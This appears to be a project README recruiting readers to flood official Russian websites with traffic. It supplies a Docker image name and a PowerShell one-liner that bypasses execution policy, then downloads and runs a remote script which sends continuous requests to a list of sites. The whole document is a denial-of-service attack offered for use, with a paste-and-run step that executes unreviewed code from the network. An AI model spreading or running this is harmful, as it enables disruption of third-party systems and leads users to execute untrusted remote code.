# What is this

The following script is flooding official Russian web sites with Internet traffic and causes disruption. 

## Docker (linux only)

givethemhell/shutthemdown

## How to Run (Windows 7+ only)
1. Open 'Windows PowerShell'. You may need to open it in admin/privilidedg mode
1. Copy and Paste the following script in the Powershell Window and Press Enter
```ps
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/givethemhell/shutthemdown/main/script.ps1'))
```

The script will create separate jobs that will constantly send requests to the listed web sites in the script. The script works as long as the PowerShell Window is open. If you want to stop the script, close the PowerShell window.

Thank you!
